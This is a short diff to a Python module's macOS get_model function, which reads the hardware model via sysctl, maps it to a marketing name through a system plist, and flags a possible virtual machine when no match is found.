@@ -16,15 +16,17 @@ class Module:
         
         
         def get_model():
-            output = run_command("sysctl hw.model")
+            model_key = run_command("sysctl -n hw.model")
             
-            if output:
-                model_key = output.split(":")[1].replace("\\n", "").replace(" ", "")
-            else:
+            if not model_key:
                 model_key = "Macintosh"
                 
             output = run_command("/usr/libexec/PlistBuddy -c 'Print :\\"%s\\"' /System/Library/PrivateFrameworks/ServerInformation.framework/Versions/A/Resources/English.lproj/SIMachineAttributes.plist | grep marketingModel" % model_key)
-            return output.split("=")[1][1:]
+            
+            if "does not exist" in output.lower():
+                return model_key + " (running in virtual machine?)"
+            else:
+                return output.split("=")[1][1:]
         
         
         def get_wifi():
